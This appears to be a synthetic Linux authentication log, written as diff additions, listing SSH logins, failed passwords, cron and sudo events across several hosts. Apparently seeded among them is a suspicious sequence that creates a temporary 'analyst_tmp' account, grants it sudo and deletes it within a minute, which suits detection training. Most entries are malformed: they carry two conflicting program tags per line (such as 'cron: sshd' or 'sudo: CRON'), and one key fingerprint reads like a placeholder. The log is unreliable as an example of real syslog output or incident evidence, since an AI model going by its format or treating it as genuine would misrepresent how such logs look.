+Oct 21 21:33:12 web-01 sshd: systemd-logind[25198]: New session 390 of user kunle.
+Oct 21 21:36:51 web-01 sshd: CRON[26568]: (backup) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 21 21:43:48 auth-gw-01 sudo: CRON[12382]: (root) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 21 21:46:31 web-01 cron: sshd[2024]: Failed password for sani from 172.16.5.12 port 46235 ssh2
+Oct 21 21:49:42 auth-gw-01 su: sshd[10352]: Accepted publickey for deploy from 198.51.100.23 port 58840 ssh2: ED25519 SHA256:oh29YAM0rZ48rvKg
+Oct 21 21:49:53 web-01 polkitd: sshd[6557]: Invalid user test from 198.51.100.44 port 54816
+Oct 21 21:58:18 api-01 sshd: sshd[12159]: Accepted publickey for ngozi from 10.0.4.22 port 40562 ssh2: ED25519 SHA256:PMCymkVGSIEByRdy
+Oct 21 21:59:04 bastion-01 su: sshd[19102]: Accepted publickey for svc_api from 172.16.5.12 port 44192 ssh2: ED25519 SHA256:LKnWDPz3fdcXy6Kt
+Oct 21 22:02:00 web-01 sshd[24001]: Accepted publickey for amara from 10.0.4.22 port 49001 ssh2: ED25519 SHA256:normalKeyExample02
+Oct 21 22:02:04 web-01 systemd-logind[24002]: New session 922 of user amara.
+Oct 21 22:02:19 api-01 sshd: sshd[18393]: Invalid user user1 from 10.0.2.15 port 35228
+Oct 21 22:10:05 auth-gw-01 su: sshd[5287]: Accepted publickey for amara from 10.0.4.22 port 43102 ssh2: ED25519 SHA256:0vkwKu2HL0tGRJeb
+Oct 21 22:14:00 web-01 sshd[24001]: Received disconnect from 10.0.4.22 port 49001:11: disconnected by user
+Oct 21 22:14:01 web-01 systemd-logind[24003]: Removed session 922.
+Oct 21 22:19:26 db-01 sshd: sshd[22571]: Failed password for amara from 198.51.100.44 port 53463 ssh2
+Oct 21 22:21:20 worker-02 polkitd: sshd[20070]: Accepted publickey for root from 10.0.8.9 port 64508 ssh2: ED25519 SHA256:8Eu0FCIo3tkIiM2g
+Oct 21 22:22:23 api-01 cron: sshd[2439]: Accepted publickey for svc_api from 192.168.1.31 port 38578 ssh2: ED25519 SHA256:D3NvnbkMzRF8jPND
+Oct 21 22:22:39 api-01 polkitd: sshd[12729]: Accepted publickey for fatima from 198.51.100.44 port 59049 ssh2: ED25519 SHA256:PD1TwCv6Du5ZXde5
+Oct 21 22:23:27 auth-gw-01 sudo: sshd[13726]: Failed password for sani from 198.51.100.23 port 56050 ssh2
+Oct 21 22:25:55 web-01 cron: sshd[13041]: Failed password for chioma from 10.0.4.22 port 50426 ssh2
+Oct 21 22:28:08 web-01 sshd: sshd[7191]: Accepted publickey for tunde from 10.0.2.15 port 61095 ssh2: ED25519 SHA256:XyWLKymxUPKeiNfq
+Oct 21 22:31:17 db-01 su: sshd[23833]: Accepted publickey for backup from 198.51.100.23 port 35888 ssh2: ED25519 SHA256:e3KFGBMamf4uB7JI
+Oct 21 22:34:27 api-01 polkitd: sshd[16271]: Accepted publickey for backup from 172.16.5.12 port 55425 ssh2: ED25519 SHA256:MQeSTuozb2AfxFDc
+Oct 21 22:37:02 db-01 sshd: sshd[14202]: Failed password for svc_api from 198.51.100.44 port 34063 ssh2
+Oct 21 22:37:42 db-01 systemd-logind: sshd[13055]: Failed password for deploy from 172.16.5.12 port 64981 ssh2
+Oct 21 22:40:04 db-01 sshd: sshd[12638]: Accepted publickey for tunde from 198.51.100.23 port 64805 ssh2: ED25519 SHA256:FuQH7M7MkhDMEJBP
+Oct 21 22:40:41 auth-gw-01 cron: systemd-logind[27943]: New session 184 of user admin.
+Oct 21 22:42:20 bastion-01 su: systemd-logind[4473]: New session 491 of user bayo.
+Oct 21 22:45:28 web-01 sshd: sudo[11841]: root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 21 22:48:35 auth-gw-01 systemd-logind: sshd[18424]: Failed password for admin from 10.0.4.22 port 46792 ssh2
+Oct 21 22:50:29 worker-02 sshd: sshd[9487]: Failed password for ada from 192.168.1.31 port 51091 ssh2
+Oct 21 23:07:16 bastion-01 cron: sudo[10950]: tunde : TTY=pts/4 ; PWD=/home/tunde ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 21 23:07:49 db-01 su: systemd-logind[7561]: New session 320 of user fatima.
+Oct 21 23:10:00 auth-gw-01 useradd[25001]: new user: name=analyst_tmp, UID=1107, GID=1107, home=/home/analyst_tmp, shell=/bin/bash
+Oct 21 23:10:18 auth-gw-01 usermod[25002]: add 'analyst_tmp' to group 'sudo'
+Oct 21 23:10:36 auth-gw-01 passwd[25003]: password changed for analyst_tmp
+Oct 21 23:10:54 auth-gw-01 userdel[25004]: delete user 'analyst_tmp'
+Oct 21 23:11:12 api-01 sshd[25005]: Did not receive identification string from 198.51.100.91 port 49201
+Oct 21 23:11:30 bastion-01 sshd[25006]: Connection closed by authenticating user admin 203.0.113.17 port 49202 [preauth]
+Oct 21 23:11:48 db-01 pam_unix(sudo:session)[25007]: session opened for user root by admin(uid=1001)
+Oct 21 23:12:06 db-01 pam_unix(sudo:session)[25008]: session closed for user root
+Oct 21 23:12:08 auth-gw-01 sshd: sshd[1904]: Accepted publickey for kunle from 192.168.1.24 port 57512 ssh2: ED25519 SHA256:uJJ35o8exhQLdjEe
+Oct 21 23:24:15 auth-gw-01 polkitd: systemd-logind[23390]: New session 292 of user deploy.
+Oct 21 23:24:35 auth-gw-01 polkitd: systemd-logind[1933]: New session 181 of user admin.
+Oct 21 23:25:24 db-01 sudo: sshd[23228]: Accepted publickey for fatima from 198.51.100.23 port 48292 ssh2: ED25519 SHA256:98cmOyoTDf6ls0Pk
+Oct 21 23:27:37 bastion-01 sshd: sshd[27680]: Failed password for bayo from 198.51.100.23 port 55785 ssh2
+Oct 21 23:29:50 db-01 polkitd: sshd[18631]: Accepted publickey for emeka from 192.168.1.31 port 36524 ssh2: ED25519 SHA256:alEwr2QVGDrP339B
+Oct 21 23:34:37 bastion-01 systemd-logind: sshd[7025]: Accepted publickey for ifeoma from 198.51.100.44 port 39989 ssh2: ED25519 SHA256:0hecsxCxSmOSwa3A
+Oct 21 23:41:24 web-01 sshd: sshd[5885]: Accepted publickey for ada from 192.168.1.31 port 61783 ssh2: ED25519 SHA256:rBskMnfjIsxxOjBB
+Oct 21 23:44:15 web-01 cron: sshd[1119]: Accepted publickey for fatima from 172.16.5.12 port 64337 ssh2: ED25519 SHA256:zGElDuoIVDBLimJn
+Oct 21 23:52:55 web-01 systemd-logind: sshd[8605]: Accepted publickey for emeka from 172.16.5.12 port 41467 ssh2: ED25519 SHA256:iMUlME2JKgCNuhKX
+Oct 21 23:59:51 bastion-01 polkitd: sshd[10404]: Accepted publickey for amara from 198.51.100.23 port 32402 ssh2: ED25519 SHA256:oK0RpALGC87U8Xcl
